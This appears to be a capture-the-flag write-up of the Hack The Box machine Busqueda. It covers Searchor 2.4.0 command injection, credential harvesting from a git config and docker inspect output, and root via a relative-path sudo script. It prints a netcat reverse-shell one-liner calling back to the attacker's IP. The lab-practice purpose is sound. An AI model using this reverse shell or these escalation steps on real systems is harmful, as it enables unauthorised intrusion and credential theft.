---
title: HTB-Busqueda
date: 18-08-2025 01:30:00
categories:
  - Writeups
  - HTB
tags:
  - Enumeration
  - git
  - python
  - docker
---
Target - 10.129.228.217

Do nmap on target with  - nmap -F {target} to see open ports.

![](https://cdn.vkie.pro/Pasted%20image%2020250819010641.png)

As seen in nmap results, we can see ssh and 80 port is open, when we navigate to 80, we found the url changed to searcher.htb

![](https://cdn.vkie.pro/Pasted%20image%2020250819010724.png)

so lets try adding into /etc/hosts file.

As soon as we added the IP and hostname in hosts file, refresh the browser and we got page as below

![](https://cdn.vkie.pro/Pasted%20image%2020250819011005.png)

as seen in footer, it says "Powered by Flask and searchor 2.4.0"

so google like " Searchor 2.4.0 poc", and i got this [link](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

As per the instructions given, follow the steps and u will get shell

![](https://cdn.vkie.pro/Pasted%20image%2020250819021759.png)
![](https://cdn.vkie.pro/Pasted%20image%2020250819021915.png)
![](https://cdn.vkie.pro/Pasted%20image%2020250819022024.png)

Enumerate the folders which we landed at first

![](https://cdn.vkie.pro/Pasted%20image%2020250819022056.png)

As noticed git folder exists in /var/www/app/, check for git configs files

![](https://cdn.vkie.pro/Pasted%20image%2020250819022139.png)

cd to ".git" folder and read "config" file

![](https://cdn.vkie.pro/Pasted%20image%2020250819022358.png)

so once again add this host in /etc/hosts file to access the url

visit "gitea.searcher.htb" and login with user "cody" and respective password.

explore the repos, we noticed administrator user exists, and his repos are private.

Also try login SSH tried login svc user with password found above, and it worked

for to privesc type sudo -l to check possiblities

![](https://cdn.vkie.pro/Pasted%20image%2020250819024015.png)

as shown above screenshot user can run those commands

![](https://cdn.vkie.pro/Pasted%20image%2020250819024123.png)

try docker-ps, docker-inspect, full-checkup

![](https://cdn.vkie.pro/Pasted%20image%2020250819024207.png)

output will be json so pipe it to the tool jq for easy reading


![](https://cdn.vkie.pro/Pasted%20image%2020250819024340.png)

from the output, we can see the creds are in env variables

try login gitea again with administrator username and with this password we got, check the private repos.

![](https://cdn.vkie.pro/Pasted%20image%2020250819025712.png)

upon checking the codes, we can see full-checkup runs full-checkup.sh, basically, The `system-checkup.py` script allows actions like `docker-ps`, `docker-inspect`, and `full-checkup`.

When the **`full-checkup` action** is triggered, the script runs a shell script called **`full-checkup.sh`**. 

Importantly, the script calls `full-checkup.sh` via a **relative path** (`./full-checkup.sh`) instead of an absolute one (e.g., `/opt/scripts/full-checkup.sh`). This means that if we place a malicious `full-checkup.sh` in any directory we can write to, and then run `system-checkup.py` from that directory, the script will execute **our malicious version** instead of the intended one — effectively giving us code execution with the same privileges the script runs under (in this case, root).

```bash
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [your ip] 9001 >/tmp/f" > /tmp/full-checkup.sh
```

run this to create our custom "full-checkup.sh" in tmp directory

listen using below command

```bash
nc -nvlp 9001
```

run "chmod +x" to make our sh script executable

now run the system-checkup command as we got output from sudo -l

cd to tmp directory and run this below

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Thats it we got root shell as shown in below screenshot

![](https://cdn.vkie.pro/Pasted%20image%2020250819031013.png)


Thanks for the time, See you in next post!!
